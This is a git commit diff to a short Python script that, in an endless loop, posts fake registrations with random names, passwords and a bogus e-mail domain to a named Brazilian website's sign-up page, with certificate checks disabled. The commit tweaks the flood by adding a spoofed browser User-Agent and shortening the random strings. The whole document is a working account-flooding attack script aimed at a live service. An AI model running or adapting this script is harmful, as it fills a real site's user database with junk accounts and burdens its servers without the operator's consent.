b754810587e19176c6bb9633df3545fb49b49ee7
TheHoltz <38303017+TheHoltz@users.noreply.github.com>
2018-12-09 13:55:47 -0200

    Some critical fixes

--- teste.py
+++ teste.py
@@ -7,11 +7,11 @@ url = 'https://www.minemarket.com.br/register/'
 lis=list(ascii_lowercase)
 
 while(1):
-    ii = ''.join(choice(lis) for _ in range(1000))
-    requests.post(url, allow_redirects=False, verify=False, data={
+    ii = ''.join(choice(lis) for _ in range(25))
+    r = requests.post(url, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=False, verify=False, data={
         'name': ii,
-        'mail': ii+'@'+'whit3own4.com',
+        'mail': ii+'@wh1t30wn4.c0m',
         'pass': ii,
         'register': ''
     })
-    print("Pacote com sucesso: %.15s"%ii);
+    print("Pacote enviado com sucesso: %s"%ii);
